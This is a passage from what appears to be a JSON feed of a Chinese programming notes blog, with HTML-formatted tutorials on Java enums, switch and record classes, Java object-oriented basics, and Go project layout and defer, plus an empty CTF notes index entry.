class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">WED</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"星期三\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">THU</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"星期四\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">FRI</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"星期五\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">SAT</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"星期六\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">SUN</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"星期日\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> dayValue<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> chinese<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> dayValue<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> chinese<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>dayValue <span class=\"token operator\">=</span> dayValue<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>chinese <span class=\"token operator\">=</span> chinese<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>chinese<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>覆写<code>toString()</code>的目的是在输出时更有可读性。</p>\n<h3>switch</h3>\n<p>最后，枚举类可以应用在<code>switch</code>语句中。因为枚举类天生具有类型信息和有限个枚举常量，所以比<code>int</code>、<code>String</code>类型更适合用在<code>switch</code>语句中：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// switch</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Weekday</span> day <span class=\"token operator\">=</span> <span class=\"token class-name\">Weekday</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SUN</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>day<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">case</span> <span class=\"token constant\">MON</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">case</span> <span class=\"token constant\">TUE</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">case</span> <span class=\"token constant\">WED</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">case</span> <span class=\"token constant\">THU</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">case</span> <span class=\"token constant\">FRI</span><span class=\"token operator\">:</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Today is \"</span> <span class=\"token operator\">+</span> day <span class=\"token operator\">+</span> <span class=\"token string\">\". Work at office!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token constant\">SAT</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">case</span> <span class=\"token constant\">SUN</span><span class=\"token operator\">:</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Today is \"</span> <span class=\"token operator\">+</span> day <span class=\"token operator\">+</span> <span class=\"token string\">\". Work at home!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cannot process \"</span> <span class=\"token operator\">+</span> day<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">enum</span> <span class=\"token class-name\">Weekday</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token constant\">MON</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">TUE</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">WED</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">THU</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FRI</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">SAT</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">SUN</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>加上<code>default</code>语句，可以在漏写某个枚举常量时自动报错，从而及时发现错误。</p>\n<h2>record类</h2>\n<p>从Java 14开始，引入了新的<code>Record</code>类。我们定义<code>Record</code>类时，使用关键字<code>record</code>。把上述<code>Point</code>类改写为<code>Record</code>类，代码如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// Record</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Point</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">456</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">y</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">record</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n</code></pre></div><p>仔细观察<code>Point</code>的定义：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">record</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n</code></pre></div><p>把上述定义改写为class，相当于以下代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Point</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Record</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> x<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> y<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">y</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Point[x=%s, y=%s]\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> o<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>除了用<code>final</code>修饰class以及每个字段外，编译器还自动为我们创建了构造方法，和字段名同名的方法，以及覆写<code>toString()</code>、<code>equals()</code>和<code>hashCode()</code>方法。</p>\n<p>换句话说，使用<code>record</code>关键字，可以一行写出一个不变类。</p>\n<p>和<code>enum</code>类似，我们自己不能直接从<code>Record</code>派生，只能通过<code>record</code>关键字由编译器实现继承。</p>\n<h3>构造方法</h3>\n<p>编译器默认按照<code>record</code>声明的变量顺序自动创建一个构造方法，并在方法内给字段赋值。那么问题来了，如果我们要检查参数，应该怎么办？</p>\n<p>假设<code>Point</code>类的<code>x</code>、<code>y</code>不允许负数，我们就得给<code>Point</code>的构造方法加上检查逻辑：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">record</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Point</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> y <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>注意到方法<code>public Point {...}</code>被称为Compact Constructor，它的目的是让我们编写检查逻辑，编译器最终生成的构造方法如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Point</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Record</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 这是我们编写的Compact Constructor:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> y <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// 这是编译器继续生成的赋值代码:</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> y<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>作为<code>record</code>的<code>Point</code>仍然可以添加静态方法。一种常用的静态方法是<code>of()</code>方法，用来创建<code>Point</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">record</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Point</span> <span class=\"token function\">of</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Point</span> <span class=\"token function\">of</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这样我们可以写出更简洁的代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">var</span> z <span class=\"token operator\">=</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">.</span><span class=\"token function\">of</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token class-name\">Point</span><span class=\"token punctuation\">.</span><span class=\"token function\">of</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token number\">456</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div>",
      "date_published": "2024-08-26T14:47:27.000Z",
      "date_modified": "2024-09-11T13:20:40.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "1-Java基础笔记",
      "url": "https://echo0d.github.io/DailyNotes/develop/Java/1_JavaBase.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Java/1_JavaBase.html",
      "summary": "1-Java基础笔记\n\nJava 教程 | 菜鸟教程 (runoob.com)\n\n基本概念\n一个 Java 程序可以认为是一系列对象的集合，而这些对象通过调用彼此的方法来协同工作。Java 作为一种面向对象的编程语言，支持以下基本概念：\n1、类（Class）：\n\n定义对象的蓝图，包括属性和方法。\n示例：public class Car { ... }\n...",
      "content_html": "\n<blockquote>\n<p><a href=\"https://www.runoob.com/java/java-tutorial.html\" target=\"_blank\" rel=\"noopener noreferrer\">Java 教程 | 菜鸟教程 (runoob.com)</a></p>\n</blockquote>\n<h2>基本概念</h2>\n<p>一个 Java 程序可以认为是一系列对象的集合，而这些对象通过调用彼此的方法来协同工作。Java 作为一种面向对象的编程语言，支持以下基本概念：</p>\n<p>1、<strong>类（Class）</strong>：</p>\n<ul>\n<li>定义对象的蓝图，包括属性和方法。</li>\n<li>示例：<code>public class Car { ... }</code></li>\n</ul>\n<p><strong>2、对象（Object）</strong>：</p>\n<ul>\n<li>类的实例，具有状态和行为。</li>\n<li>示例：<code>Car myCar = new Car();</code></li>\n</ul>\n<p><strong>3、继承（Inheritance）</strong>：</p>\n<ul>\n<li>一个类可以继承另一个类的属性和方法。</li>\n<li>示例：<code>public class Dog extends Animal { ... }</code></li>\n</ul>\n<p><strong>4、封装（Encapsulation）</strong>：</p>\n<ul>\n<li>\n<p>将对象的状态（字段）私有化，通过公共方法访问。</p>\n</li>\n<li>\n<p>示例：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>private String name; \npublic String getName() { return name; }\n</code></pre></div></li>\n</ul>\n<p><strong>5、多态（Polymorphism）</strong>：</p>\n<ul>\n<li>对象可以表现为多种形态，主要通过方法重载和方法重写实现。</li>\n<li>示例：\n<ul>\n<li>方法重载：<code>public int add(int a, int b) { ... }</code> 和 <code>public double add(double a, double b) { ... }</code></li>\n<li>方法重写：<code>@Override public void makeSound() { System.out.println(\"Meow\"); }</code></li>\n</ul>\n</li>\n</ul>\n<p><strong>6、抽象（Abstraction）</strong>：</p>\n<ul>\n<li>使用抽象类和接口来定义必须实现的方法，不提供具体实现。</li>\n<li>示例：\n<ul>\n<li>抽象类：<code>public abstract class Shape { abstract void draw(); }</code></li>\n<li>接口：<code>public interface Animal { void eat(); }</code></li>\n</ul>\n</li>\n</ul>\n<p><strong>7、接口（Interface）</strong>：</p>\n<ul>\n<li>定义类必须实现的方法，支持多重继承。</li>\n<li>示例：<code>public interface Drivable { void drive(); }</code></li>\n</ul>\n<p><strong>8、方法（Method）</strong>：</p>\n<ul>\n<li>定义类的行为，包含在类中的函数。</li>\n<li>示例：<code>public void displayInfo() { System.out.println(\"Info\"); }</code></li>\n</ul>\n<p><strong>9、方法重载（Method Overloading）</strong>：</p>\n<ul>\n<li>\n<p>同一个类中可以有多个同名的方法，但参数不同。</p>\n</li>\n<li>\n<p>示例：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>public class MathUtils {\n    public int add(int a, int b) {\n        return a + b;\n    }\n\n    public double add(double a, double b) {\n        return a + b;\n    }\n}\n</code></pre></div></li>\n</ul>\n",
      "date_published": "2024-08-20T14:39:14.000Z",
      "date_modified": "2024-08-26T14:47:27.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "CTF笔记",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/CTF/",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/CTF/",
      "summary": "CTF笔记",
      "content_html": "\n",
      "date_published": "2024-08-19T06:46:53.000Z",
      "date_modified": "2024-08-19T06:46:53.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "1. 基础收尾",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/ImprovingGo/1_GoFinal.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/ImprovingGo/1_GoFinal.html",
      "summary": "1. 基础收尾\n1.1. 项目结构\n在 Go 语言中，经典的项目结构通常遵循一种约定俗成的布局，这有助于使项目更具可读性和易维护性。以下是一个经典的 Go 项目结构示例：\n\ncmd/: 包含应用程序的入口点，每个可执行程序应该有一个对应的文件夹。\ninternal/: 包含项目私有的代码，不希望被外部代码引用。\npkg/: 包含项目的可重用代码包，可以...",
      "content_html": "\n<h2>1.1. 项目结构</h2>\n<p>在 Go 语言中，经典的项目结构通常遵循一种约定俗成的布局，这有助于使项目更具可读性和易维护性。以下是一个经典的 Go 项目结构示例：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>project-root/\n|-- cmd/\n|   |-- main.go\n|\n|-- internal/\n|   |-- pkg1/\n|   |   |-- ...\n|   |\n|   |-- pkg2/\n|   |   |-- ...\n|   |\n|   |-- ...\n|\n|-- pkg/\n|   |-- pkg3/\n|   |   |-- ...\n|   |\n|   |-- pkg4/\n|   |   |-- ...\n|   |\n|   |-- ...\n|\n|-- api/\n|   |-- http/\n|   |   |-- ...\n|   |\n|   |-- grpc/\n|   |   |-- ...\n|   |\n|   |-- ...\n|\n|-- configs/\n|   |-- config.go\n|\n|-- deployments/\n|   |-- docker/\n|   |   |-- Dockerfile\n|   |\n|   |-- kubernetes/\n|   |   |-- ...\n|   |\n|   |-- ...\n|\n|-- docs/\n|   |-- ...\n|\n|-- pkg/\n|   |-- ...\n|\n|-- scripts/\n|   |-- ...\n|\n|-- test/\n|   |-- ...\n|\n|-- .gitignore\n|-- go.mod\n|-- go.sum\n|-- README.md\n</code></pre></div><ul>\n<li><strong>cmd/</strong>: 包含应用程序的入口点，每个可执行程序应该有一个对应的文件夹。</li>\n<li><strong>internal/</strong>: 包含项目私有的代码，不希望被外部代码引用。</li>\n<li><strong>pkg/</strong>: 包含项目的可重用代码包，可以被其他项目引用。</li>\n<li><strong>api/</strong>: 包含项目的 API 定义，例如 HTTP 和 gRPC 的端点。</li>\n<li><strong>configs/</strong>: 包含项目的配置文件。</li>\n<li><strong>deployments/</strong>: 包含部署相关的文件，例如 Dockerfile 和 Kubernetes 配置。</li>\n<li><strong>docs/</strong>: 包含项目文档和说明。</li>\n<li><strong>scripts/</strong>: 包含项目的脚本文件。</li>\n<li><strong>test/</strong>: 包含项目的测试代码。</li>\n<li><strong>.gitignore</strong>: Git 忽略文件列表。</li>\n<li><strong>go.mod</strong> 和 <strong>go.sum</strong>: Go modules 文件，用于管理项目依赖。</li>\n<li><strong>README.md</strong>: 项目的说明文件。</li>\n</ul>\n<p>这种结构有助于组织和管理代码，同时也提供了清晰的分层结构和可扩展性。项目结构可能会因项目规模和需求而有所不同，但上述示例代表了一个通用的 Go 项目结构。</p>\n<h2>1.2. defer函数</h2>\n<p>在 Go 语言中，<code>defer</code> 语句用于延迟（defer）函数的执行直到包含 <code>defer</code> 语句的函数执行完毕。<code>defer</code> 语句允许在函数执行的任何时候注册一个函数调用，该函数会在函数执行完毕时被调用。这种机制通常用于确保资源在函数执行完毕后得到正确释放，以及在函数返回之前执行清理操作。</p>\n<p>defer的运行机制决定了无论函数是执行到函数体末尾正常返回，还是在函数体中的某个错误处理分支显式调用return返回，或函数体内部出现panic，已经注册了的deferred函数都会被调度执行。</p>\n<h3><strong>基本语法</strong></h3>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>func someFunction() {\n    defer fmt.Println(\"This will be executed last\")\n    \n    // Other function logic\n}\n</code></pre></div><h3><strong>示例用途</strong></h3>\n<p><strong>资源释放</strong>：<code>defer</code> 经常用于关闭文件、释放锁、关闭数据库连接等操作，确保资源得到正确释放。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span>filename <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    file<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">defer</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在函数返回前关闭文件</span>\n    <span class=\"token comment\">// 读取文件内容</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><strong>跟踪执行</strong>：<code>defer</code> 可以用于跟踪函数的执行情况。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">printStartAndEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">defer</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Function end\"</span><span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Function start\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><strong>处理错误</strong>：<code>defer</code> 可以用于处理错误，确保清理操作在函数返回时执行。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">cleanup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">recover</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 处理错误</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">someFunction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">defer</span> <span class=\"token function\">cleanup</span><span class=\"token punctuation\">(</span><span class=\"token 